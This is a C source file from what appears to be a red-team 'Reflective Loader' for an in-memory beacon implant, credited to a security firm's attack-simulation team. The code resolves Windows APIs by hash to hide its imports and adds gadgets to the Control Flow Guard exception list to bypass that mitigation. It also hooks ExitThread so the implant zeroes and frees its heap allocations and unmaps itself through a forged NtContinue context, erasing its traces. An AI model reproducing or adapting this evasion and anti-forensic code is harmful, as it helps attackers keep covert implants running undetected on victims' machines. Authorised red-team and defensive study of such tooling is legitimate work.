/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

NTSTATUS
NTAPI
RtlFlsFree(
	_In_ ULONG Index
);

typedef struct
{
	D_API( SetProcessValidCallTargets );
	D_API( NtFreeVirtualMemory );
	D_API( RtlExitUserThread );
	D_API( RtlCaptureContext );
	D_API( RtlFreeHeap );
	D_API( RtlFlsFree );
	D_API( NtContinue );
} API ;

#define H_API_SETPROCESSVALIDCALLTARGETS	0x647d9236 /* SetProcessValidCallTargets */
#define H_API_NTFREEVIRTUALMEMORY		0x2802c609 /* NtFreeVirtualMemory */
#define H_API_RTLEXITUSERTHREAD			0x2f6db5e8 /* RtlExitUserThread */
#define H_API_RTLCAPTURECONTEXT			0xeba8d910 /* RtlCaptureContext */
#define H_API_RTLFREEHEAP			0x73a9e4d7 /* RtlFreeHeap */
#define H_API_NTCONTINUE			0xfc3a6c2c /* NtContinue */
#define H_API_RTLFLSFREE			0xa12b09de /* RtlFlsFree */

#define H_LIB_KERNELBASE			0x03ebb38b /* kernelbase.dll */
#define H_LIB_NTDLL				0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Adds a gadget to the CFG exception list.
 *
!*/
static D_SEC( D ) VOID CfgEnableFunc( _In_ PVOID ImageBase, _In_ PVOID Function )
{
	API			Api;
	CFG_CALL_TARGET_INFO	Cfg;

	SIZE_T			Len = 0;

	PVOID			Kbs = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Cfg, sizeof( Cfg ) );

	Dos = C_PTR( ImageBase );
	Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
	Len = U_PTR( ( Nth->OptionalHeader.SizeOfImage + 0x1000 - 1 ) &~ ( 0x1000 - 1 ) );

	if ( ( Kbs = PebGetModule( H_LIB_KERNELBASE ) ) != NULL ) {
		Api.SetProcessValidCallTargets = PeGetFuncEat( Kbs, H_API_SETPROCESSVALIDCALLTARGETS );

		if ( Api.SetProcessValidCallTargets != NULL ) {
			Cfg.Flags  = CFG_CALL_TARGET_VALID;
			Cfg.Offset = U_PTR( Function ) - U_PTR( ImageBase );

			Api.SetProcessValidCallTargets( NtCurrentProcess(), Dos, Len, 1, &Cfg );
		};
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Cfg, sizeof( Cfg ) );
};

/*!
 *
 * Purpose:
 *
 * Frees the memory associated with beacon, and 
 * frees itself from memory.
 *
!*/

D_SEC( D ) VOID WINAPI ExitThread_Hook( _In_ DWORD ExitCode )
{
	API			Api;
	CONTEXT			Ctx;

	INT			Idx = 0;
	SIZE_T			Len = 0;

	PTABLE			Tbl = NULL;
	PVOID			Img = NULL;
	PLIST_ENTRY		Nxt = NULL;
	PLIST_ENTRY		Hdr = NULL;
	PLIST_ENTRY		Ent = NULL;
	PHEAP_ENTRY_BEACON	Heb = NULL;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );

	Api.NtFreeVirtualMemory = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTFREEVIRTUALMEMORY );
	Api.RtlExitUserThread   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLEXITUSERTHREAD );
	Api.RtlCaptureContext   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCAPTURECONTEXT );
	Api.RtlFreeHeap         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
	Api.RtlFlsFree          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFLSFREE );
	Api.NtContinue          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCONTINUE );

	CfgEnableFunc( PebGetModule( H_LIB_NTDLL ), Api.NtContinue );
	CfgEnableFunc( PebGetModule( H_LIB_NTDLL ), Api.RtlExitUserThread );
	CfgEnableFunc( PebGetModule( H_LIB_NTDLL ), Api.NtFreeVirtualMemory );

	if ( Api.RtlFlsFree != NULL ) {
		for ( Idx = 0 ; Idx < 0x1000 ; ++Idx ) {
			Api.RtlFlsFree( Idx );
		};
	};

	/* Get pointer to the table address */
	Tbl = C_PTR( G_SYM( Table ) );
	Hdr = C_PTR( & Tbl->Table->HeapList );
	Ent = C_PTR( Hdr->Flink );

	/* Enumerate heap entries */
	for ( ; Ent != Hdr ; Ent = C_PTR( Nxt ) ) {
		Nxt = C_PTR( Ent->Flink );
		Heb = C_PTR( CONTAINING_RECORD( Ent, HEAP_ENTRY_BEACON, HeapList ) );

		RtlSecureZeroMemory( Heb->Buffer, Heb->Length );
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Heb->Buffer );
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Heb );
		Heb = NULL;
	};

	/* Free the memory allocated by Beacon */
	Img = Tbl->Table->RxBuffer;
	Len = 0;
	Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Tbl->Table );

	/* Acquire the current frame address */
	Ctx.ContextFlags = CONTEXT_FULL; Api.RtlCaptureContext( &Ctx );

#if defined( _WIN64 )
	Ctx.Rip  = U_PTR( Api.NtFreeVirtualMemory );
	Ctx.Rsp  = ( Ctx.Rsp &~ ( 0x1000 - 1 ) ) - sizeof( PVOID );
	Ctx.Rcx  = U_PTR( NtCurrentProcess() );
	Ctx.Rdx  = U_PTR( & Img );
	Ctx.R8   = U_PTR( & Len );
	Ctx.R9   = U_PTR( MEM_RELEASE );
	*( ULONG_PTR volatile * )( Ctx.Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Api.RtlExitUserThread );
#else
	Ctx.Eip  = U_PTR( Api.NtFreeVirtualMemory );
	Ctx.Esp  = ( Ctx.Esp &~ ( 0x1000 - 1 ) ) - sizeof( PVOID );
	*( ULONG_PTR volatile * )( Ctx.Esp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Api.RtlExitUserThread );
	*( ULONG_PTR volatile * )( Ctx.Esp + ( sizeof( ULONG_PTR ) * 0x1 ) ) = U_PTR( NtCurrentProcess() );
	*( ULONG_PTR volatile * )( Ctx.Esp + ( sizeof( ULONG_PTR ) * 0x2 ) ) = U_PTR( & Img );
	*( ULONG_PTR volatile * )( Ctx.Esp + ( sizeof( ULONG_PTR ) * 0x3 ) ) = U_PTR( & Len );
	*( ULONG_PTR volatile * )( Ctx.Esp + ( sizeof( ULONG_PTR ) * 0x4 ) ) = U_PTR( MEM_RELEASE );
#endif

	/* Execute new frame in memory */
	Ctx.ContextFlags = CONTEXT_FULL; Api.NtContinue( &Ctx, FALSE );
};
